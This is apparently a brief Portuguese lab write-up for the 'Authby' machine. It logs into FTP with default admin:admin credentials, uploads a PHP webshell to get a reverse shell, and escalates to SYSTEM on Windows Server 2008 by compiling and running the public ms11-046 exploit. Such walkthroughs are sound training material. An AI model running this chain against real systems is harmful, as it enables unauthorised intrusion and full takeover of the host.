# Authby
> ftp admin:admin + ms11-046 (Server 2008)

## Enumeração

```
nmap -sC -sV -oN nmap.txt <IP>
```

FTP na porta 21 com credenciais padrão.

## Exploração

```
ftp <IP>
# user: admin
# pass: admin
```

Upload de webshell via FTP para diretório web acessível.

```
put shell.php
```

Execução de comando via browser → reverse shell.

## Escalada de Privilégio

Windows Server 2008 identificado. Exploit `ms11-046`:

```
searchsploit ms11-046
```

```
i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32
```

```
exploit.exe
```

SYSTEM obtido.
